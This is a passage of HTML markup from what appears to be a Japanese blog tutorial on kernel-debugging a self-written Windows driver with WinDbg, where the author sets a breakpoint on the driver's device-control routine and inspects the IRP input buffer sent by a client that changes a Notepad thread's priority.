UirAkvb56yaEL7+C8PU3CB4/hvXtd4jfvK3eHVMJc4wus58JA6yaKgGahkkmZpWPWLPNqTcyWVJFKWcvoTZeIe/1MWtdISFlTCaswfZ6PWJkVgcj0hCGYQXAfMv8tlwu4BFbBs5kQ5bofgjDDxCT6fczVSaXcYIgVIuIHM3YMsd/Slg3YsrZnFGJGvTNicMAlqGD7x/uVYCqqt5dEilyjCFzAfPd/cGizZQmSQrNnUFQbMh2BJfY6ppGaRRXFlYMbyPd7/crLS59pCwqdBas28F6HTtnLaotqGhc8XjHyxhLKq47HQiCWFn4J+DUtzkoTpmRAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/87f9871280c443cd79688290c6f4679e/8ac56/image-22.webp 240w,
/static/87f9871280c443cd79688290c6f4679e/d3be9/image-22.webp 480w,
/static/87f9871280c443cd79688290c6f4679e/5e3e0/image-22.webp 554w&quot;
              sizes=&quot;(max-width: 554px) 100vw, 554px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/87f9871280c443cd79688290c6f4679e/8ff5a/image-22.png 240w,
/static/87f9871280c443cd79688290c6f4679e/e85cb/image-22.png 480w,
/static/87f9871280c443cd79688290c6f4679e/04abd/image-22.png 554w&quot;
            sizes=&quot;(max-width: 554px) 100vw, 554px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/87f9871280c443cd79688290c6f4679e/04abd/image-22.png&quot;
            alt=&quot;image-22.png&quot;
            title=&quot;image-22.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;このスレッドを最大の優先順位である31に設定してみます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:\Driver\SecondDriverClient&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe 8616 31&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;アプリケーションの実行が完了すると、このようにメモ帳スレッドの優先順位が31に変更されました。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/590aec4f72437db74fea11a1a8190b43/0b533/image-23.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 73.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACGElEQVQ4y41UyW7aUBQ1IKGUn2EDUrpJJSS+gR3iY1inq4Ao/YAki+YbElA2CClpWiExKHbAE3gMNmCwOb3vpaG0JYErHb/B9x7f0cJYVWFbFkzT4PC8KVzHxrNtw3NdOKYJlyA1mlBub6E0mwgHAzBZr9fsgW0RGKFhWtB1HaqqQdNe1sdHkT5gQVYUqIoK8eYGo0YDw+trhP3+24TGZAKFjAzDICIVEzqPx2Mi1iBJEr9zyFtHeoIvy/BGI0QUESPbBUEnY0kUYZESIzUpPAZG3G630Wq1uPchDhMhCIK9Sp7ncS+Z7mI+R7BY8P2/WC6XEHxSYBLtcH+1WvF3366ucHLyCfl8HrlcDh+Pj5HNZjkymcxmTafTECxvtknwW4Rf6nUIgoBUKoVkMokPR0dIJBL87j9Mp/O9hLVabUMYi8U2xmz/emZrPB5nhH88/Eu2CM/OKtyIG+zyahu6PoZtO5ToAI7jwvd8eL4PjaqsU9W92Qynp58PJ5RHMhHaiMIIIjXzkPpMfxpC+vETJrUTogjVavVwQta4bDJ88kqVFd5v07t7dOtfoV1eAt0uar+LchAha+L5bM57yKHQ2dlynzGkEZzQLDOpVF5yyCrMqvsehBnlKKKwwjAk0gAyjZdJudNp9GQKn+3L5fJ+z17R6XQwoL9HnwaeQaS89bo9PHx/QK/X47N8fn6BQqGAUqmEYrH4Ln4Bvx1oDKTeWugAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/590aec4f72437db74fea11a1a8190b43/8ac56/image-23.webp 240w,
/static/590aec4f72437db74fea11a1a8190b43/d3be9/image-23.webp 480w,
/static/590aec4f72437db74fea11a1a8190b43/b0a15/image-23.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/590aec4f72437db74fea11a1a8190b43/8ff5a/image-23.png 240w,
/static/590aec4f72437db74fea11a1a8190b43/e85cb/image-23.png 480w,
/static/590aec4f72437db74fea11a1a8190b43/0b533/image-23.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/590aec4f72437db74fea11a1a8190b43/0b533/image-23.png&quot;
            alt=&quot;image-23.png&quot;
            title=&quot;image-23.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;カーネルデバッグで挙動を確認してみる&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%87%E3%83%90%E3%83%83%E3%82%B0%E3%81%A7%E6%8C%99%E5%8B%95%E3%82%92%E7%A2%BA%E8%AA%8D%E3%81%97%E3%81%A6%E3%81%BF%E3%82%8B&quot; aria-label=&quot;カーネルデバッグで挙動を確認してみる permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルデバッグで挙動を確認してみる&lt;/h2&gt;
&lt;p&gt;さて、ここまでずいぶん時間がかかりましたが、ここからがようやく本題です。&lt;/p&gt;
&lt;p&gt;WinDbgからカーネルデバッグを行い、自作したカーネルドライバの動きを見てみたいと思います。&lt;/p&gt;
&lt;p&gt;カーネルデバッグの設定方法については過去にも紹介したので割愛します。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-004-kernel-debug&quot;&gt;WinDbgでWindows10環境のカーネルデバッグを行う最初の一歩&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windriver-001-tutorial&quot;&gt;Windowsカーネルドライバを自作してWinDbgで解析してみる&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;ブレークポイントを設定する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%96%E3%83%AC%E3%83%BC%E3%82%AF%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88%E3%82%92%E8%A8%AD%E5%AE%9A%E3%81%99%E3%82%8B&quot; aria-label=&quot;ブレークポイントを設定する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ブレークポイントを設定する&lt;/h3&gt;
&lt;p&gt;とりあえずカーネルデバッグを仕掛けたあと、&lt;code class=&quot;language-text&quot;&gt;SecondDriver&lt;/code&gt;のモジュールがロードされていることを確認します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;kd&gt; lmDvmSecondDriver
Browse full module list
&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;             &lt;span class=&quot;token keyword&quot;&gt;end&lt;/span&gt;                 module name
fffff801`18390000 fffff801`18397000   SecondDriver   &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;deferred&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;             
    Image path: \??\C:\Driver\SecondDriver\SecondDriver&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
    Image name: SecondDriver&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;sys
    Browse all global symbols  functions  &lt;span class=&quot;token keyword&quot;&gt;data&lt;/span&gt;
    Timestamp:        Sat Jan 29 20:08:51 2022 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;61F52043&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
    CheckSum:         0000EB8D
    ImageSize:        00007000
    Translations:     0000&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;04b0 0000&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;04e4 0409&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;04b0 0409&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;04e4
    Information &lt;span class=&quot;token keyword&quot;&gt;from&lt;/span&gt; resource tables:&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここまでソースコードを見てきた通り、クライアントからのIRPを受け取って実際に優先順位を変更する処理を行うのは&lt;code class=&quot;language-text&quot;&gt;SecondDriverDeviceControl&lt;/code&gt;です。&lt;/p&gt;
&lt;p&gt;そのため、&lt;code class=&quot;language-text&quot;&gt;SecondDriverDeviceControl&lt;/code&gt;にブレークポイントを仕掛けた状態でクライアントアプリケーションによる優先順位変更を実施します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;kd&gt; bu SecondDriver!SecondDriverDeviceControl
kd&gt; bl
     0 e Disable Clear  fffff801`18391040  &lt;span class=&quot;token namespace&quot;&gt;[G:\Try2WinDbg\drivers\SecondDriverSample\SecondDriver\SecondDriver.cpp @ 18]&lt;/span&gt;     0001 &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;0001&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; SecondDriver!SecondDriverDeviceControl&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;先ほど同様にメモ帳を起動して、メモ帳のスレッドの優先順位を31に変更するよう、クライアントアプリケーションから要求を実行します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;powershell&quot;&gt;&lt;pre class=&quot;language-powershell&quot;&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:\Driver\SecondDriverClient&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;exe 8520 31&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;irpを解析する&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#irp%E3%82%92%E8%A7%A3%E6%9E%90%E3%81%99%E3%82%8B&quot; aria-label=&quot;irpを解析する permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;IRPを解析する&lt;/h3&gt;
&lt;p&gt;今回はソースウィンドウも出してみました。&lt;/p&gt;
&lt;p&gt;ブレークポイントで処理が停止したときに、ソースコードのどの箇所かが一目でわかるのでとても便利です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 932px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/821532881aff984b5d35308ef816777d/f6f78/image-24.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 93.75%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAATCAYAAACQjC21AAAACXBIWXMAAAsTAAALEwEAmpwYAAADWUlEQVQ4y41U2W4jNxCcL88X5Cm/k7dkN8FaWh/yWrJkaWRJc5+c+55KNSUHxgIBQqDQlEg2q7qLY/z2p4Vf/3Dwy+8XfDmkyPIaQVrBTwp4cc55qRGqCm6UYbc/Y7lcYfW8RRSlOJ0uGmEYw/NCGGXdoO9auJYsHGEe32E5DmHD9Tw0XYdpnjW6foDKChwOJtYvG5zez3h+fsEPzo+cO44HIy0rVA0QRh1vVIhChboeMI7Q+DymaSaTDL7fEBUsK4XjKgRBA6VGVBVgxHEC33tC4P4F1/4bgX+HLH1ElhDxE/GIQq1QZU9oa5csIry9XWCaNvZ7h3MP+0OI4zGmwoAM8xx5WeB4NuH4O8Yf2JmPuNhbFLkPldioyhDjkGHoa9i2h91uj/3bHpuNidXqjO3WxcGM8W46MDLyrFtKDibSZhP8mBIiJLHSRW+a7oYeXdfrkvg+GxWwaV5L2YDtEDYon5LTokI/TsiLGn7swfIsJmLCJEYcxyiKAiUVSKx4uWO7ZLjF6+sL2Z2wWJZYr1t2vcXD9wFGkpcYpIvsgB/mtE3OwywDY5ZlbFCNYRhuGHE+W7TNEg8Pj7i7W2CxWLLr4g4Tr2vrynBkwqaemYAdZ8vTNGcsNaOczCSp/K5psTM9t1gscH9/r3H37RtL4FP6hTXcw1C3hG078U+RWbE2qWanVKalTtNEC31iqBN+J8t7fP36BevNhl038U4Pa4Yiue8GyixRsF5NU2tWIrssSjajY8IR3MbLAnZ1i836jdEkdpR8oG2OvOxyqyENOxNxUmvJZVlqZmma6jhLJsza2Emq4LoeLpecUlvuKWj2gF33eVl8TThxuxyMaHJJIrUTVh/NaNtW/xbbWJbD7q5o6h0lHmjmEy9wdR0Vzxox3+bAGhVFo51u0xZym1Lq1oxKo2kaHUWyR4ZhGPGF+Xoury1JrmQMy3K1gaMo4ULORAVvyrkh46FExywrNaT7tu3rr0qeV7rmAlmTfXHMhEVxtYNACi9RujnS7DLv+6vsru14WOqqdJQ9svYZNZ+cEYShlvIxxC5ibJEotRPLyOj7ns/S17Uef/4M3YZcYgw/LUoCYSSHrgfnf9ek2/M84b+G7DfyTOqlUFZXywiE+kcZPv77Pyjo6X8AsbaeA26Sb2AAAAAASUVORK5CYII=&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/821532881aff984b5d35308ef816777d/8ac56/image-24.webp 240w,
/static/821532881aff984b5d35308ef816777d/d3be9/image-24.webp 480w,
/static/821532881aff984b5d35308ef816777d/3b46e/image-24.webp 932w&quot;
              sizes=&quot;(max-width: 932px) 100vw, 932px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/821532881aff984b5d35308ef816777d/8ff5a/image-24.png 240w,
/static/821532881aff984b5d35308ef816777d/e85cb/image-24.png 480w,
/static/821532881aff984b5d35308ef816777d/f6f78/image-24.png 932w&quot;
            sizes=&quot;(max-width: 932px) 100vw, 932px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/821532881aff984b5d35308ef816777d/f6f78/image-24.png&quot;
            alt=&quot;image-24.png&quot;
            title=&quot;image-24.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;ソースウィンドウは非常に便利で、ソースコードからブレークポイントをさらに設定することができます。&lt;/p&gt;
&lt;p&gt;今回はクライアントアプリケーションから受け取ったIRPの情報を確認したいので、スタックロケーションの取得が終わった次の行にブレークポイントを設定します。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 565px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/e832e3c4755d1dba113b7cb74dd97190/07eba/image-25.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 77.5%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAAsTAAALEwEAmpwYAAACnklEQVQ4y51SaWvcMBDd//9bCik0NNC0C0lp6UELSWC76+2uL61vr23Zsny/jrQHaUL6oQPDjEbS6L2nmaWej4hzuNYXuOZnBOw77M0nbI1b+O43VPkSNTcgyUWxAs+WkJWBkupNtUZdriD4iuISY59jlrAdwiJD4t/AMC5gsktsnUtYuyssrVfYum+wti9gOK/hs2v4zjVi7wM8ivtwjjy+0Z5Fc/SNj1lkOciaHsp+2ykebr/i/t0NFu8/4ufVHHfXt3ig/MfbOUIWo5IDOG9RVR1y3uCpzSLTRiJoYxrpkES0ceH/WsK9u4e/XMFbLBGu1gioVuUZmrZBXQu0jYSUAkJU2mvycRwxK0SNQraYpgmODYRJhyhNESQpGOlrMxfObocgjmFaFsliIAhDlGWJnB7gpL+KRVFgGKhhlhcIy5oQTvRSh5JeSnmCOI8R7gPUhKJrO/R9j77r0PU9XjIFapYXXCM8WcF7+JEHL2LYBQyWbSEIAnieB9/3Ke6wI8T7/R5JktBeiJQYRVGkIyHkB4Rk4zjRMwBjJVariHRq9SF1MSbKqolaq1wIoTVTrpANw6BdI0yEPDYcqdgec/yX6Yb5kbJ6ybQ5HNcjNDEJLeC6KSyLISFkGSEs8hxZliEMD1RThfrIQDHRDeNKnhtWJbBe29hsTLogsFiE2G4OusVxpLVkjCGmyyeaJ1cf9wwhMNA8gkQejiSUTofDyg+yDDq+SPkxwroeaGBrtK2kvKZc6vlSey2NTUMD3dBnqXrbtto7qv81Nll9Qgj6WfXLHhyHaX1M0zyOjU96unptbk2d19RU1lI3PzdUgx1wcSBHhWkaSLuRmkrKR01ToWiaRiNRKNW6H4ZnQ32mXDzScHhy8F82aQDTuZmKfwBc9sV5X3o0CgAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/e832e3c4755d1dba113b7cb74dd97190/8ac56/image-25.webp 240w,
/static/e832e3c4755d1dba113b7cb74dd97190/d3be9/image-25.webp 480w,
/static/e832e3c4755d1dba113b7cb74dd97190/acb73/image-25.webp 565w&quot;
              sizes=&quot;(max-width: 565px) 100vw, 565px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/e832e3c4755d1dba113b7cb74dd97190/8ff5a/image-25.png 240w,
/static/e832e3c4755d1dba113b7cb74dd97190/e85cb/image-25.png 480w,
/static/e832e3c4755d1dba113b7cb74dd97190/07eba/image-25.png 565w&quot;
            sizes=&quot;(max-width: 565px) 100vw, 565px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/e832e3c4755d1dba113b7cb74dd97190/07eba/image-25.png&quot;
            alt=&quot;image-25.png&quot;
            title=&quot;image-25.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;今回は今までと趣向を変えて、GUI中心に解析をしてみようと思います。&lt;/p&gt;
&lt;p&gt;スタックロケーションの取得が終わった次の行に処理を進めた時点で、Localsウィンドウからスタックロケーションの情報を参照します。&lt;/p&gt;
&lt;p&gt;WinDbgのGUI上では、こんな感じで構造体の情報が整形されて確認できるようになります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 899px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/dd5b748009f59f5d831aa65ca2a4850a/681f1/image-26.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 45.833333333333336%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAAsTAAALEwEAmpwYAAABZUlEQVQoz3WQ/U6DMBTF9/5/G+O2zBgTE9/CxGzTJe4J/JoDyvimhQKDwrG9yIIzNjk0vYf76+md3G8Zrjcu5msLNy8eFhuG6WqPmdZ8bVP94uEN06U+P9lUm60sLJ77vqvlFy4fP3G79XG39TCppYAIXSjJYVZbCPCAoUgClGlIqniESvSCKnuhAfcZYtc69QKdBtYNbOYi4UIfAS4y1E37Y/eii4y6fjc1pT+v7x9w/YB8pU3VaaCUBRzHQS5zMsqyBOcceZ6jqiocj0eqKaX6S3TTIOYw2LaNtm1P3sQ07XY7uK6rjQ48TbG39ojimIBG50BKrCGMMXieB6FfJXPZA02SVEOGH7Msw8E7INZAKSWKoqD9HGj2IAgQhiHquiafgHGcIIoieqIpmISWZZ0uGWsMNACTMEkS6i306AjIhaAnDcsk8n2fEpq5mnQmddM0fxIOs/41w/Fh+Pm/dZ5yXB/0DZlCsRg+O4h1AAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/dd5b748009f59f5d831aa65ca2a4850a/8ac56/image-26.webp 240w,
/static/dd5b748009f59f5d831aa65ca2a4850a/d3be9/image-26.webp 480w,
/static/dd5b748009f59f5d831aa65ca2a4850a/8bcb7/image-26.webp 899w&quot;
              sizes=&quot;(max-width: 899px) 100vw, 899px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/dd5b748009f59f5d831aa65ca2a4850a/8ff5a/image-26.png 240w,
/static/dd5b748009f59f5d831aa65ca2a4850a/e85cb/image-26.png 480w,
/static/dd5b748009f59f5d831aa65ca2a4850a/681f1/image-26.png 899w&quot;
            sizes=&quot;(max-width: 899px) 100vw, 899px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/dd5b748009f59f5d831aa65ca2a4850a/681f1/image-26.png&quot;
            alt=&quot;image-26.png&quot;
            title=&quot;image-26.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;アプリケーションから受け渡しされた引数は、デバイスコントロールルーチンに渡されたIRPの入力バッファに格納されているのでした。&lt;/p&gt;
&lt;p&gt;入力バッファの参照先を確認すると&lt;code class=&quot;language-text&quot;&gt;0x1cefd9f6d8&lt;/code&gt;であることがわかります。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 309px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/2b706ba164031ccb8f6aa1e71b152317/532e8/image-27.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 48.75000000000001%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAAsTAAALEwEAmpwYAAABaElEQVQoz51Sa3OCMBDk//+6dqYqIEkgQVTeCFYewvYSi6XUT72ZnUnC3XK7d9bnrUVZXdDUNeI4Rl4UBhMeMU2TwfL8fX2+L8O6NFdIFSIIAgOfIKVEQ+/DMDwT18WvyAzhre2QpClCIlFKGTIpFVzHRVlWGMcR9/vdJM/nZYdrYmu+5nkGxgR8weExD77vQx0i2LaNlH6ooyhyCCFwH6eF/N92WPNDQYQ+JXPG4bp7yPAAxpnBHFVZGgVr6Uv8EGYZBBdQRKS91J2cz2cjc86pqhLbzQZMBAhVgOh4+uth13VUMOJ0OmG/38NxHXDOSeoOu52N6lKj7ztCjzRJqHvHKHh/f8PHZktWFTS8Hm3bQnNZNU2zIClKSdiOA+a5ROwaqXo4GRVosq7ryZacujricAiNGuZ5iJMUQ/8g1LCqujF+Sb0utD6aWPuUkgX/CSK8Gt886sqhVeE03SiKnmuyNn2JV9+/AHrb/uPrOEYXAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/2b706ba164031ccb8f6aa1e71b152317/8ac56/image-27.webp 240w,
/static/2b706ba164031ccb8f6aa1e71b152317/451be/image-27.webp 309w&quot;
              sizes=&quot;(max-width: 309px) 100vw, 309px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/2b706ba164031ccb8f6aa1e71b152317/8ff5a/image-27.png 240w,
/static/2b706ba164031ccb8f6aa1e71b152317/532e8/image-27.png 309w&quot;
            sizes=&quot;(max-width: 309px) 100vw, 309px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/2b706ba164031ccb8f6aa1e71b152317/532e8/image-27.png&quot;
            alt=&quot;image-27.png&quot;
            title=&quot;image-27.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;というわけで、メモリウィンドウから参照先のアドレスに格納されている値を見てみます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 403px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/321e106c693079f7889192779df1e18a/045fd/image-28.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
